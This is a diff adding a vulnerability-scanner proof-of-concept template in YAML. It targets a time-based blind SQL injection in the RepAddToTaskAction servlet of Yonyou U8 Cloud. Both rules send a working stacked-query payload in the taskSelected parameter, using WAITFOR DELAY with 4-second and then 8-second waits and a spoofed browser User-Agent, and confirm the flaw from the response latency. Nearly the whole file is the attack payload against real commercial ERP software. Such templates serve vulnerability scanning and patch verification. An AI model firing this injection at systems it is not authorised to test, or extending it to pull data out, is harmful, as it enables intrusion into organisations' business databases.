@@ -1,0 +1,29 @@
+name: poc-yaml-yongyouU8-Cloud-RepAddToTaskAction-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.RepAddToTaskAction&method=save&taskSelected=1%27);WAITFOR+DELAY+%270:0:4%27--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: GET
+      path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.RepAddToTaskAction&method=save&taskSelected=1%27);WAITFOR+DELAY+%270:0:8%27--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+ 
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487100&idx=1&sn=1ad666c8aaacc4a7c9415a0627937de4&chksm=c267bb4ff510325959a25e4321fc3e8b53db0a6c7266676d0bc60b9915bdf315567bd4f3dd1c&token=101124693&lang=zh_CN#rd
+
+
+
+
